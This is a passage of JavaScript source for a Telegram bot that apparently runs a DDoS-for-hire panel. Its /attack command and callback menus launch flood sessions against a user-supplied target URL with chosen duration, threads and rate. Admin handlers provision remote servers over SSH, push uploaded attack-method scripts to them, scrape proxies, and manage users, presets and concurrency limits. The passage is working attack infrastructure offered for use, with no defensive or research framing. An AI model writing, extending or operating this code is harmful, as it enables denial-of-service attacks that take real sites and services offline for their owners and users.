}));

bot.onText(/^\/provision\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const servers = store.servers.get();
  if (!servers.length) return reply(msg, '📭 No servers');
  await reply(msg, `⚡ Provisioning ${servers.length} server(s)…`);
  let ok = 0;
  for (const s of servers) {
    try {
      const conn = await getServerConn(s.id);
      await provisionRemote(s.id, conn);
      ok++;
    } catch (e) {
      await reply(msg, `❌ ${esc(s.name)}: ${esc(e.message.slice(0, 100))}`);
    }
  }
  await reply(msg, `✅ Provisioned ${ok}/${servers.length}`);
}));

bot.onText(/^\/installdeps\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const servers = store.servers.get().filter(s => s.status === 'online');
  if (!servers.length) return reply(msg, '📭 No online servers');
  await reply(msg, `📦 Installing deps on ${servers.length} server(s)…\n<i>${REMOTE_DEPS.length} packages</i>`);
  let ok = 0;
  const failed = [];
  for (const s of servers) {
    try {
      const conn = await getServerConn(s.id);
      const env = remoteEnvCache.get(s.id) || await collectRemoteEnv(s.id, conn);
      if (!env?.nodePath) { failed.push(`${s.name}: no node`); continue; }
      remoteDepsCache.delete(s.id);
      await ensureDepsOnRemote(conn, s.id, env);
      ok++;
    } catch (e) {
      failed.push(`${s.name}: ${e.message.slice(0, 80)}`);
    }
  }
  const txt = [`✅ Deps ready on <b>${ok}/${servers.length}</b>`];
  if (failed.length) {
    txt.push('');
    txt.push('<b>Failed:</b>');
    failed.forEach(f => txt.push(`• ${esc(f)}`));
  }
  await reply(msg, txt.join('\n'));
}));

bot.onText(/^\/intensities\b/, guardCommand(async msg => { ensureUser(msg); await showIntensities(msg.chat.id, null, msg.from.id); }));

bot.onText(/^\/admins\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const owners = CONFIG.ADMIN_IDS.map(id => getUser(id) || { telegramId: id, firstName: `Owner#${id}` });
  const promoted = Object.values(store.users.get()).filter(u => u.role === 'admin' && !isOwner(u.telegramId));
  const txt = [
    `👑 <b>All Admins</b>`, ``,
    `<b>Owners (${owners.length})</b> — env-locked:`,
    ...owners.map(o => `• <code>${o.telegramId}</code> ${esc(o.firstName || o.username || '?')}`),
    ``,
    `<b>Promoted (${promoted.length})</b>:`,
    ...promoted.slice(0, 15).map(p => `• <code>${p.telegramId}</code> ${esc(p.firstName || p.username || '?')}${p.promotedBy ? ` (by ${p.promotedBy})` : ''}`),
    promoted.length > 15 ? `… +${promoted.length - 15} more` : '',
  ].filter(Boolean).join('\n');
  await reply(msg, txt);
}));

bot.onText(/^\/health\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const mem = process.memoryUsage();
  const uptime = process.uptime();
  const sessions = Object.values(store.sessions.get()).filter(s => s.status === 'running').length;
  const s = serverStats();
  const online = botIsOnline();
  await reply(msg, [
    `💚 <b>Health ${VERSION}</b>`, ``,
    `🏛 Status: ${online ? '🟢 ONLINE' : '🔴 MAINTENANCE'}`,
    `⏱ Uptime: ${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m`,
    `🧠 Heap: ${(mem.heapUsed / 1048576).toFixed(1)} / ${(mem.heapTotal / 1048576).toFixed(1)} MB`,
    `📦 RSS: ${(mem.rss / 1048576).toFixed(1)} MB`,
    `📡 Servers: ${s.online}/${s.total}`,
    `⚔️ Sessions: ${sessions}`,
    `💥 Methods: ${allMethods().filter(m => m.enabled).length}/${allMethods().length}`,
    `🔌 SSH conns: ${serverConns.size}`,
    `🌀 Restarts: ${pollingRestarts}`,
    `📦 Deps: ${REMOTE_DEPS.length} packages`,
  ].join('\n'));
}));

bot.onText(/^\/attack(?:\s+(.+))?/, guardCommand(async (msg, match) => {
  const user = ensureUser(msg);

  if (user.role === 'pending') return reply(msg, '⏳ <b>Pending approval.</b>');
  if (user.role === 'banned') return reply(msg, '🚫 <b>Banned.</b>');

  if (!getBucket(user.telegramId).take(1)) return reply(msg, '🌊 <b>Slow down.</b>');

  const cdLeft = getCooldownLeft(msg.from.id);
  if (cdLeft > 0) return reply(msg, `⏳ Cooldown: <b>${cdLeft}s</b>`);

  if (!match[1]) {
    // no args → show method picker
    return startAttackFlow(msg.chat.id, user.telegramId);
  }

  const rawArgs = match[1].trim().split(/\s+/);
  let group = null;
  const gIdx = rawArgs.indexOf('--group');
  if (gIdx > -1 && rawArgs[gIdx + 1]) { group = rawArgs[gIdx + 1]; rawArgs.splice(gIdx, 2); }

  const methodId = rawArgs[0];

  if (methodId && methodId.startsWith('@')) {
    const name = methodId.slice(1);
    const preset = store.presets.get()[name];
    if (!preset) return reply(msg, `❌ Preset <code>@${esc(name)}</code> not found`);
    const method = getMethod(preset.method);
    if (!method) return reply(msg, `❌ Preset method missing`);
    if (!isMethodEnabled(method.id)) return reply(msg, `🔴 ${esc(method.name)} disabled`);
    if (!userCanUseMethod(user, method.id)) return reply(msg, `🔒 No access`);
    const target = rawArgs[1];
    const duration = rawArgs[2] || String(preset.duration || 60);
    let parsed;
    try {
      parsed = method.parse([target, duration, String(preset.threads), String(preset.rate)]);
      if (!parsed.target || !parsed.duration) throw new Error('target and duration required');
      const t = validateTarget(parsed.target);
      if (isBlacklisted(t.host)) throw new Error('host blacklisted');
      checkUserLimits(user, parsed.duration, parsed.threads, parsed.rate);
    } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }
    return runAttack(user, method, parsed, msg.chat.id, { group, intensity: 'preset' });
  }

  const method = getMethod(methodId);
  if (!method) {
    return reply(msg, `❌ Unknown method <code>${esc(methodId)}</code>\n\n<b>Available:</b>\n${availableMethods().map(m => `${m.emoji} <code>${m.id}</code>`).join('\n')}`);
  }
  if (!isMethodEnabled(method.id)) return reply(msg, `🔴 <b>${esc(method.name)}</b> is disabled.`);
  if (!userCanUseMethod(user, method.id)) return reply(msg, `🔒 You don't have access to <b>${esc(method.name)}</b>.`);
  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, method.file))) return reply(msg, `❌ Missing file <code>${method.file}</code>`);

  const conc = user.limits?.maxConcurrent || 0;
  if (conc > 0 && userActiveCount(msg.from.id) >= conc) return reply(msg, `❌ Max concurrent (${conc}) reached.`);

  const target = rawArgs[1];
  const duration = rawArgs[2];
  const threadsArg = rawArgs[3];
  const rateArg = rawArgs[4];

  if (!target || !duration) {
    return reply(msg, `❌ Missing args.\n<b>Usage:</b>\n<code>/attack ${method.id} &lt;url&gt; &lt;dur&gt;</code> — picker\n<code>/attack ${method.id} &lt;url&gt; &lt;dur&gt; &lt;threads&gt; &lt;rate&gt;</code> — direct`);
  }

  if (threadsArg && rateArg) {
    let parsed;
    try {
      parsed = method.parse([target, String(duration), String(threadsArg), String(rateArg)]);
      if (!parsed.target || !parsed.duration) throw new Error('target and duration required');
      const t = validateTarget(parsed.target);
      if (isBlacklisted(t.host)) throw new Error('host blacklisted');
      checkUserLimits(user, parsed.duration, parsed.threads, parsed.rate);
    } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }
    return runAttack(user, method, parsed, msg.chat.id, { group, intensity: 'custom' });
  }

  let t;
  try {
    t = validateTarget(target);
    if (isBlacklisted(t.host)) return reply(msg, `🚫 <code>${esc(t.host)}</code> blacklisted`);
    const dur = Number(duration);
    if (!dur || dur < 1 || dur > 3600) throw new Error('duration 1-3600s');
    checkUserLimits(user, dur, 0, 0);
  } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }

  await showIntensityMenu(msg.chat.id, user.telegramId, method.id, target, String(duration));
}));

bot.onText(/^\/methods\b/, guardCommand(async msg => { ensureUser(msg); await showMethods(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/servers\b/, guardCommand(async msg => { ensureUser(msg); await showServers(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/status\b/, guardCommand(async msg => { ensureUser(msg); await showStatus(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/sessions\b/, guardCommand(async msg => { ensureUser(msg); await showSessions(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/history\b/, guardCommand(async msg => { ensureUser(msg); await showHistory(msg.chat.id, null, msg.from.id, 1); }));

bot.onText(/^\/logs(?:\s+(.+))?/, guardCommand(async msg => {
  ensureUser(msg);
  const id = (msg.text.match(/^\/logs\s+(\S+)/) || [])[1];
  if (!id) return reply(msg, 'Usage: <code>/logs &lt;session_id&gt;</code>');
  const live = store.sessions.get()[id];
  if (!live) return reply(msg, '❌ Session not found');
  if (live.owner !== msg.from.id && !isAdmin(msg.from.id)) return reply(msg, '❌ Not yours');
  const out = await tailSessionLog(id, 30);
  await reply(msg, `📜 <b>Logs ${esc(id)}</b>\n\n<pre>${esc(out.slice(0, 3500))}</pre>`);
}));

bot.onText(/^\/broadcast(?:\s+(.+))?/, guardCommand(async (msg, match) => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  if (!match[1]) return reply(msg, 'Usage: <code>/broadcast &lt;message&gt;</code>');
  const text = match[1].trim();
  const users = Object.values(store.users.get()).filter(u => u.role === 'admin' || u.role === 'user');
  await reply(msg, `📢 Broadcasting to ${users.length} users…`);
  let ok = 0, fail = 0;
  for (const u of users) {
    try {
      await bot.sendMessage(u.telegramId, `📢 <b>${BRAND}</b>\n\n${esc(text)}`, { parse_mode: 'HTML' });
      ok++;
    } catch { fail++; }
    await new Promise(r => setTimeout(r, 50));
  }
  await reply(msg, `✅ Sent: ${ok} · ❌ Failed: ${fail}`);
}));

bot.onText(/^\/me\b/, guardCommand(async msg => {
  const u = ensureUser(msg);
  const l = u.limits || {};
  const cdLeft = getCooldownLeft(msg.from.id);
  await reply(msg, [
    `${roleBadge(u)} <b>Account</b>`,
    `ID: <code>${u.telegramId}</code> · Role: <b>${roleLabel(u)}</b>`,
    ``,
    `Dur ${l.maxDuration || '∞'} · Th ${l.maxThreads || '∞'} · Rate ${l.maxRate || '∞'} · Conc ${l.maxConcurrent || '∞'}`,
    `Access: <b>${userAccessBadge(u)}</b>`,
    cdLeft ? `⏳ Cooldown ${cdLeft}s` : '',
  ].filter(Boolean).join('\n'), { reply_markup: mainMenu(msg.from.id) });
}));

bot.onText(/^\/stop(?:\s+(.+))?/, guardCommand(async (msg, match) => {
  ensureUser(msg);
  const id = match[1];
  if (!id) return reply(msg, 'Usage: <code>/stop &lt;session_id&gt;</code>');
  const s = store.sessions.get()[id];
  if (!s) return reply(msg, '❌ Not found');
  if (s.owner !== msg.from.id && !isAdmin(msg.from.id)) return reply(msg, '❌ Not yours');
  stopSession(id, 'manual');
  await reply(msg, `✅ Stopped <code>${id}</code>`);
}));

bot.onText(/^\/killall\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const n = stopAllSessions(null);
  await reply(msg, n ? `💀 Killed ${n}` : '📭 None');
}));

bot.onText(/^\/scrape\b/, guardCommand(async msg => {
  const u = ensureUser(msg);
  if (!isAdmin(msg.from.id) && u.role !== 'user') return reply(msg, '❌ Denied');
  await reply(msg, '🔄 Scraping…');
  const n = await scrapeProxies();
  await reply(msg, `✅ +${n} · Total ${readProxies().length}`);
}));

bot.onText(/^\/syncmethods\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  const servers = store.servers.get().filter(s => s.status === 'online');
  if (!servers.length) return reply(msg, '📭 No online servers');
  await reply(msg, `🔄 Syncing to ${servers.length}…`);
  let ok = 0;
  await Promise.allSettled(servers.map(async s => { try { await syncMethodToServer(s.id, null); ok++; } catch {} }));
  await reply(msg, `✅ ${ok}/${servers.length}`);
}));

bot.onText(/^\/admin\b/, guardCommand(async msg => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only');
  await showAdminPanel(msg.chat.id, null, msg.from.id);
}));

/* ══════════════════════════════════════════════════════════════════════════
   CALLBACK ROUTER
   ══════════════════════════════════════════════════════════════════════════ */

bot.on('callback_query', async q => {
  const chatId = q.message.chat.id;
  const msgId = q.message.message_id;
  const userId = q.from.id;
  const data = q.data || '';

  if (!botIsOnline() && !isAdmin(userId)) {
    return answerCB(q.id, '🛠 Maintenance mode — back soon', true);
  }

  try {
    if (data === 'menu_main')     { await answerCB(q.id, '🏠'); return showMainMenu(chatId, msgId, userId); }
    if (data === 'menu_attack')   {
      await answerCB(q.id, '💥');
      return startAttackFlow(chatId, userId);
    }
    if (data === 'menu_status')   { await answerCB(q.id, '📊'); return showStatus(chatId, msgId, userId); }
    if (data === 'menu_servers')  { await answerCB(q.id, '📡'); return showServers(chatId, msgId, userId); }
    if (data === 'menu_methods')  { await answerCB(q.id, '📦'); return showMethods(chatId, msgId, userId); }
    if (data === 'menu_sessions') { await answerCB(q.id, '🕹'); return showSessions(chatId, msgId, userId); }
    if (data === 'menu_history')  { await answerCB(q.id, '📜'); return showHistory(chatId, msgId, userId, 1); }
    if (data === 'menu_admin') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '👑');
      return showAdminPanel(chatId, msgId, userId);
    }
    if (data === 'stop_all_mine') {
      const n = stopAllSessions(userId);
      await answerCB(q.id, `Stopped ${n}`, true);
      return showStatus(chatId, msgId, userId);
    }
    if (data === 'noop') return answerCB(q.id, '');

    if (data.startsWith('hist_p')) {
      return showHistory(chatId, msgId, userId, parseInt(data.slice(6), 10) || 1);
    }

    // NEW FLOW: method picker from New Attack
    if (data.startsWith('pickm_')) {
      const methodId = data.slice(6);
      const user = getUser(userId) || { telegramId: userId };
      const m = getMethod(methodId);
      if (!m) return answerCB(q.id, '❌ Method not found', true);
      if (!isMethodEnabled(m.id)) return answerCB(q.id, '🔴 Disabled', true);
      if (!userCanUseMethod(user, m.id)) return answerCB(q.id, '🔒 No access', true);
      await answerCB(q.id, `${m.emoji} ${m.name}`);
      return startQuickLaunch(chatId, user, methodId);
    }

    if (data === 'adm_botcontrol') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '🤖');
      return showBotControl(chatId, msgId);
    }
    if (data === 'botctl_on') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      store.botstate.mutate(s => {
        s.online = true;
        s.lastToggleBy = userId;
        s.lastToggleAt = new Date().toISOString();
      });
      audit('bot_online', userId, {});
      await answerCB(q.id, '🟢 Bot ONLINE', true);
      return showBotControl(chatId, msgId);
    }
    if (data === 'botctl_off') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      store.botstate.mutate(s => {
        s.online = false;
        s.lastToggleBy = userId;
        s.lastToggleAt = new Date().toISOString();
      });
      audit('bot_offline', userId, {});
      await answerCB(q.id, '🔴 Bot OFFLINE (maintenance)', true);
      return showBotControl(chatId, msgId);
    }
    if (data === 'botctl_msg') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'botctl_msg', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, '✏️');
      return bot.sendMessage(chatId, `✏️ <b>New maintenance message</b>\n\nSend the message users will see:`, { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }

    if (data === 'int_cancel') {
      pendingInput.delete(userId);
      await answerCB(q.id, '❌ Cancelled', true);
      return edit(chatId, msgId, '❌ <b>Attack cancelled.</b>', { reply_markup: backMenu() });
    }
    if (data.startsWith('int_')) {
      const level = data.slice(4);
      const preset = INTENSITY[level];
      if (!preset) return answerCB(q.id, '❌ Unknown intensity', true);
      if (preset.adminOnly && !isAdmin(userId)) return answerCB(q.id, '🔒 Admin only', true);

      const pending = pendingInput.get(userId);
      if (!pending || pending.action !== 'awaiting_intensity') {
        return answerCB(q.id, '❌ Session expired — start again', true);
      }
      const { methodId, target, duration } = pending.data;
      pendingInput.delete(userId);

      const user = getUser(userId) || { telegramId: userId };
      const method = getMethod(methodId);
      if (!method) return answerCB(q.id, '❌ Method gone', true);
      if (!isMethodEnabled(method.id)) return answerCB(q.id, '🔴 Disabled', true);
      if (!userCanUseMethod(user, method.id)) return answerCB(q.id, '🔒 No access', true);

      if (user.role === 'pending') return answerCB(q.id, '⏳ Pending', true);
      if (user.role === 'banned') return answerCB(q.id, '🚫 Banned', true);

      const cdLeft = getCooldownLeft(userId);
      if (cdLeft > 0) return answerCB(q.id, `⏳ ${cdLeft}s cooldown`, true);

      const conc = user.limits?.maxConcurrent || 0;
      if (conc > 0 && userActiveCount(userId) >= conc) return answerCB(q.id, `❌ Max concurrent (${conc})`, true);

      let parsed;
      try {
        parsed = method.parse([target, String(duration), String(preset.threads), String(preset.rate)]);
        const t = validateTarget(parsed.target);
        if (isBlacklisted(t.host)) throw new Error('host blacklisted');
        checkUserLimits(user, parsed.duration, parsed.threads, parsed.rate);
      } catch (e) {
        return answerCB(q.id, '❌ ' + e.message, true);
      }

      await answerCB(q.id, `${preset.emoji} ${preset.label}`, true);
      await edit(chatId, msgId,
        `💥 <b>Launching...</b>\n\n${method.emoji} ${esc(method.name)}\n${preset.emoji} ${preset.label}\n🎯 <code>${esc(target)}</code>\n⏱ ${duration}s · ${preset.threads}T · ${preset.rate}R`,
        { reply_markup: { inline_keyboard: [] } });

      return runAttack(user, method, parsed, chatId, { intensity: level });
    }

    if (data.startsWith('sess_stop_')) {
      const id = data.slice(10);
      const s = store.sessions.get()[id];
      if (!s) return answerCB(q.id, '❌', true);
      if (s.owner !== userId && !isAdmin(userId)) return answerCB(q.id, '❌ not yours', true);
      stopSession(id, 'manual');
      await answerCB(q.id, `🛑 stopped`, true);
      return showSessions(chatId, msgId, userId);
    }

    if (data.startsWith('method_') && !/^method(view|_test_|_resync_|_delete_)/.test(data)) {
      const id = data.slice('method_'.length);
      await answerCB(q.id, '📦');
      return showMethodDetail(chatId, msgId, id, userId);
    }

    if (data.startsWith('quick_')) {
      const methodId = data.slice('quick_'.length);
      const m = getMethod(methodId);
      if (!m) return answerCB(q.id, '❌', true);
      const user = getUser(userId) || { telegramId: userId };
      if (!isMethodEnabled(m.id)) return answerCB(q.id, '🔴 disabled', true);
      if (!userCanUseMethod(user, m.id)) return answerCB(q.id, '🔒 no access', true);
      await answerCB(q.id, '💥');
      return startQuickLaunch(chatId, user, m.id);
    }

    if (data.startsWith('adm_users_p')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showAdminUsers(chatId, msgId, parseInt(data.slice(11), 10) || 1);
    }
    if (data === 'adm_users') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showAdminUsers(chatId, msgId, 1);
    }
    if (data === 'adm_manage') {
      if (!isOwner(userId)) return answerCB(q.id, '🚫 Owner only', true);
      return showManageAdmins(chatId, msgId);
    }
    if (data.startsWith('usr_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showUserActions(chatId, msgId, data.slice(4), userId);
    }
    if (data.startsWith('makeadm_')) {
      if (!isOwner(userId)) return answerCB(q.id, '❌ Owner only', true);
      const t = data.slice(8);
      if (isOwner(Number(t))) return answerCB(q.id, '❌ already owner', true);
      const u = getUser(t);
      if (!u) return answerCB(q.id, '❌ user gone', true);
      if (u.role === 'admin') return answerCB(q.id, '❌ already admin', true);
      upsertUser(t, {
        role: 'admin',
        limits: { ...ADMIN_LIMITS },
        promotedBy: userId,
        promotedAt: new Date().toISOString(),
      });
      audit('user_promoted', userId, { target: t });
      await answerCB(q.id, '👑 Promoted to admin', true);
      return showUserActions(chatId, msgId, t, userId);
    }
    if (data.startsWith('revokadm_')) {
      if (!isOwner(userId)) return answerCB(q.id, '❌ Owner only', true);
      const t = data.slice(9);
      if (isOwner(Number(t))) return answerCB(q.id, '❌ cannot demote owner', true);
      const u = getUser(t);
      if (!u || u.role !== 'admin') return answerCB(q.id, '❌ not admin', true);
      upsertUser(t, {
        role: 'user',
        limits: { ...DEFAULT_LIMITS },
        demotedBy: userId,
        demotedAt: new Date().toISOString(),
      });
      audit('user_demoted', userId, { target: t });
      await answerCB(q.id, '✅ Demoted to user', true);
      return showUserActions(chatId, msgId, t, userId);
    }
    if (data.startsWith('uaccessall_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(11);
      upsertUser(t, { allowedMethods: null });
      await answerCB(q.id, '🟢 All', true);
      return showUserAccess(chatId, msgId, t);
    }
    if (data.startsWith('uaccessnone_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(12);
      upsertUser(t, { allowedMethods: [] });
      await answerCB(q.id, '🔒 None', true);
      return showUserAccess(chatId, msgId, t);
    }
    if (data.startsWith('uaccess_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showUserAccess(chatId, msgId, data.slice(8));
    }
    if (data.startsWith('uat_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const rest = data.slice(4);
      const sep = rest.indexOf('_');
      if (sep < 0) return answerCB(q.id, '❌', true);
      const targetId = rest.slice(0, sep);
      const mid = rest.slice(sep + 1);
      const u = getUser(targetId);
      if (!u) return answerCB(q.id, '❌ user gone', true);
      const wasAllowed = (u.allowedMethods === null || u.allowedMethods === undefined) || (Array.isArray(u.allowedMethods) && u.allowedMethods.includes(mid));
      if (wasAllowed) {
        let am = u.allowedMethods;
        if (am === null || am === undefined) am = allMethods().map(m => m.id);
        am = am.filter(x => x !== mid);
        upsertUser(targetId, { allowedMethods: am });
      } else {
        const cur = Array.isArray(u.allowedMethods) ? [...u.allowedMethods] : [];
        if (!cur.includes(mid)) cur.push(mid);
        upsertUser(targetId, { allowedMethods: cur });
      }
      await answerCB(q.id, wasAllowed ? '🔒 revoked' : '✅ granted');
      return showUserAccess(chatId, msgId, targetId);
    }
    if (data.startsWith('approve_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(8);
      if (isOwner(Number(t))) return answerCB(q.id, '❌ cannot change owner role', true);
      upsertUser(t, { role: 'user' });
      await answerCB(q.id, '✅', true);
      return showUserActions(chatId, msgId, t, userId);
    }
    if (data.startsWith('ban_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(4);
      if (isOwner(Number(t))) return answerCB(q.id, '❌ cannot ban owner', true);
      const u = getUser(t);
      if (u?.role === 'admin') return answerCB(q.id, '❌ demote admin first', true);
      upsertUser(t, { role: 'banned' });
      await answerCB(q.id, '🚫', true);
      return showUserActions(chatId, msgId, t, userId);
    }
    if (data.startsWith('del_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(4);
      if (isOwner(Number(t))) return answerCB(q.id, '❌ cannot delete owner', true);
      const u = getUser(t);
      if (u?.role === 'admin') return answerCB(q.id, '❌ demote admin first', true);
      store.users.mutate(u => { delete u[t]; });
      await answerCB(q.id, '❌', true);
      return showAdminUsers(chatId, msgId, 1);
    }
    if (data.startsWith('setdur_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(7);
      pendingInput.set(userId, { action: 'set_dur', data: { targetId: t }, expires: Date.now() + 60000 });
      await answerCB(q.id, '⏱');
      return bot.sendMessage(chatId, `Max duration (0=∞):`, { reply_markup: { force_reply: true, selective: true } });
    }
    if (data.startsWith('setconc_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(8);
      pendingInput.set(userId, { action: 'set_conc', data: { targetId: t }, expires: Date.now() + 60000 });
      await answerCB(q.id, '⚔️');
      return bot.sendMessage(chatId, `Max concurrent (0=∞):`, { reply_markup: { force_reply: true, selective: true } });
    }

    if (data === 'adm_methods') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showAdminMethods(chatId, msgId);
    }
    if (data === 'methods_enable_all') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      store.methodstate.mutate(s => {
        for (const m of allMethods()) {
          if (!s[m.id]) s[m.id] = { enabled: true, stats: { launches: 0, lastAt: 0, lastBy: null } };
          s[m.id].enabled = true;
        }
      });
      await answerCB(q.id, '🟢 All enabled', true);
      return showAdminMethods(chatId, msgId);
    }
    if (data === 'methods_disable_all') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      store.methodstate.mutate(s => {
        for (const m of allMethods()) {
          if (!s[m.id]) s[m.id] = { enabled: false, stats: { launches: 0, lastAt: 0, lastBy: null } };
          s[m.id].enabled = false;
        }
      });
      await answerCB(q.id, '🔴 All disabled', true);
      return showAdminMethods(chatId, msgId);
    }
    if (data.startsWith('methodview_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showAdminMethodDetail(chatId, msgId, data.slice(11));
    }
    if (data.startsWith('mtoggle_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(8);
      const st = getMethodState(id);
      updateMethodState(id, { enabled: !st.enabled });
      await answerCB(q.id, !st.enabled ? '🟢 enabled' : '🔴 disabled', true);
      audit('method_toggled', userId, { method: id, enabled: !st.enabled });
      return showAdminMethodDetail(chatId, msgId, id);
    }
    if (data.startsWith('method_test_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(12);
      const m = getMethod(id);
      if (!m) return answerCB(q.id, '❌', true);
      if (m.builtin) return answerCB(q.id, 'built-in', true);
      try {
        const testArgs = buildArgsFromTemplate(m.template, 'https://test.local', '60', '16', '90');
        const cmd = `node ${m.file} ${testArgs.map(a => /\s/.test(a) ? `"${a}"` : a).join(' ')}`;
        await answerCB(q.id, '🧪', true);
        return edit(chatId, msgId,
          `🧪 <b>Test — ${esc(m.name)}</b>\n\n<b>Template:</b>\n<code>${esc(m.template)}</code>\n\n<b>Command:</b>\n<code>${esc(cmd)}</code>`,
          { reply_markup: { inline_keyboard: [[btn('⬅️ Back', `methodview_${id}`, 'primary')]] } });
      } catch (e) { return answerCB(q.id, '❌ ' + e.message, true); }
    }
    if (data.startsWith('method_resync_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(14);
      const m = getMethod(id);
      if (!m) return answerCB(q.id, '❌', true);
      await answerCB(q.id, '🔄', true);
      const servers = store.servers.get().filter(s => s.status === 'online');
      let ok = 0;
      await Promise.allSettled(servers.map(async s => {
        try {
          remoteHashCache.delete(`${s.id}:${m.file}`);
          remoteDepsCache.delete(s.id);
          await syncMethodToServer(s.id, m.file);
          ok++;
        } catch {}
      }));
      await answerCB(q.id, `${ok}/${servers.length}`, true);
      return showAdminMethodDetail(chatId, msgId, id);
    }
    if (data.startsWith('method_delete_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(14);
      store.methods.mutate(list => { const i = list.findIndex(x => x.id === id); if (i >= 0) list.splice(i, 1); });
      store.methodstate.mutate(s => { delete s[id]; });
      store.users.mutate(u => {
        for (const key of Object.keys(u)) {
          if (Array.isArray(u[key].allowedMethods)) u[key].allowedMethods = u[key].allowedMethods.filter(x => x !== id);
        }
      });
      await answerCB(q.id, '🗑', true);
      return showAdminMethods(chatId, msgId);
    }
    if (data === 'addmethod_start') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'am_file', data: {}, expires: Date.now() + 300000 });
      await answerCB(q.id, '🔧');
      return bot.sendMessage(chatId,
        `🔧 <b>Add Method</b>\n\nStep 1/4 — Send the <code>.js</code> file as a document.`,
        { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }
    if (data === 'addmethod_save') {
      const pending = pendingInput.get(userId);
      if (!pending || pending.action !== 'am_confirm') return answerCB(q.id, '❌', true);
      const d = pending.data;
      const validation = await validateMethodFile(d.fileName);
      if (!validation.ok) return answerCB(q.id, '❌ ' + validation.error, true);
      store.methods.mutate(list => {
        list.push({
          id: d.methodId, name: d.methodId, file: d.fileName,
          template: d.template, sample: d.sampleCmd,
          example: `/attack ${d.methodId} <url> <dur>`,
          addedBy: userId, addedAt: new Date().toISOString(),
        });
      });
      updateMethodState(d.methodId, { enabled: true });
      pendingInput.delete(userId);
      await answerCB(q.id, '✅', true);
      const sm = await bot.sendMessage(chatId, '⚙️ Syncing…');
      const servers = store.servers.get().filter(s => s.status === 'online');
      let ok = 0;
      await Promise.allSettled(servers.map(async s => {
        try {
          remoteHashCache.delete(`${s.id}:${d.fileName}`);
          remoteDepsCache.delete(s.id);
          await syncMethodToServer(s.id, d.fileName);
          ok++;
        } catch {}
      }));
      return edit(chatId, sm.message_id,
        `✅ <b>Method added!</b>\n\nID: <code>${d.methodId}</code>\nFile: <code>${d.fileName}</code>\nTemplate: <code>${esc(d.template)}</code>\n\n🎯 <code>/attack ${d.methodId} https://example.com 60</code>\n📤 ${ok}/${servers.length} servers`,
        { reply_markup: { inline_keyboard: [[btn('⬅️ Back', 'adm_methods', 'primary')]] } });
    }
    if (data === 'addmethod_cancel') {
      pendingInput.delete(userId);
      await answerCB(q.id, '❌', true);
      return showAdminMethods(chatId, msgId);
    }

    if (data === 'adm_presets') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showAdminPresets(chatId, msgId);
    }
    if (data.startsWith('preset_del_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const name = data.slice(11);
      store.presets.mutate(p => { delete p[name]; });
      await answerCB(q.id, '🗑', true);
      return showAdminPresets(chatId, msgId);
    }
    if (data.startsWith('preset_') && !data.startsWith('preset_del_') && !data.startsWith('preset_add')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showPresetDetail(chatId, msgId, data.slice(7));
    }
    if (data === 'preset_add') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
